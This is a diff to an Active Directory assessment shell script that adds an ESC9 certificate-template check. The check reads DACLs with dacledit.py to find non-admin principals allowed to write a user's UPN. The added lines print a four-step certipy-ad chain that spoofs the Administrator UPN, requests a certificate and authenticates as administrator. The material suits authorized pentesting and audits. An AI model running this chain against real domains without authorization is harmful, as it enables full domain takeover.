@@ -399,6 +399,37 @@ if [ ! -z "$CERTIPY_CMD" ]; then
             ESC8_VULN=1
           fi
         fi
+
+        # ESC9 WriteUPN
+        if echo "$VULNS" | grep -q "ESC9"; then
+          echo -e "${GREY}[--] ESC9 detected — checking WriteUPN precondition${NC}"
+          UPN_WRITE=$(dacledit.py -action read -dc-ip $DC_IP "$FULL_USER:$PASSWORD" \
+            -b "$DOMAIN_DN" 2>/dev/null | awk '
+            /Target.*CN=/ { target=$NF }
+            /Object type.*28630eb8/ { upn=1 }
+            /Access mask/ { mask=$NF }
+            /Trustee \(SID\)/ {
+              trustee=$NF
+              if (upn && mask ~ /0x20|WriteProperty/) {
+                if (trustee !~ /Domain Admins|Enterprise Admins|Administrators|SYSTEM|S-1-5-18/) {
+                  print trustee " → " target
+                }
+              }
+              upn=0
+            }
+          ' | sort -u)
+          if [ ! -z "$UPN_WRITE" ]; then
+            echo -e "${RED}[KO] ESC9 WriteUPN principals found → esc9_writeupn.txt${NC}"
+            echo "$UPN_WRITE" > "$OUTPUT_DIR/esc9_writeupn.txt"
+            echo -e "${GREY}          ESC9 chain:${NC}"
+            echo -e "${GREY}          1) certipy-ad account update -u '$AD_USER' -p '$PASSWORD' -dc-ip $DC_IP -user <TARGET> -upn Administrator${NC}"
+            echo -e "${GREY}          2) certipy-ad req -u <TARGET> -p <PASS> -dc-ip $DC_IP -ca <CA> -template <TEMPLATE>${NC}"
+            echo -e "${GREY}          3) certipy-ad account update -u '$AD_USER' -p '$PASSWORD' -dc-ip $DC_IP -user <TARGET> -upn <TARGET>@$DOMAIN (restore)${NC}"
+            echo -e "${GREY}          4) certipy-ad auth -pfx administrator.pfx -dc-ip $DC_IP${NC}"
+          else
+            echo -e "${GREEN}[OK] ESC9 detected but no WriteUPN principals found${NC}"
+          fi
+        fi
       done
     else
       echo -e "${GREEN}[OK] ADCS detected, no exploitable vulnerabilities${NC}"
